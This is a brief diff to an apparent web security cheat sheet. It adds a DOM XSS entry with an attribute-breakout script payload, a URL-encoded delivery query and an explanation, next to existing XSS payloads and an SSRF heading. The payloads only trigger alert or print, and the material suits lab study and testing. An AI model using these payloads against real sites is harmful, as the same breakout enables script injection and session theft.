@@ -24,6 +24,11 @@ javascript:alert(1)
 # DOM XSS via jQuery hashchange
 #<img src=x onerror=print()>
 # Delivery: iframe.src = sameURL + '#hash'
+
+# DOM XSS via document.write + location.search
+"><script>alert(1)</script>
+# Injected via: /?search=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+# Key: double quote breaks out of attribute, script tag executes
 ```
 
 ### SSRF — Bypass Techniques
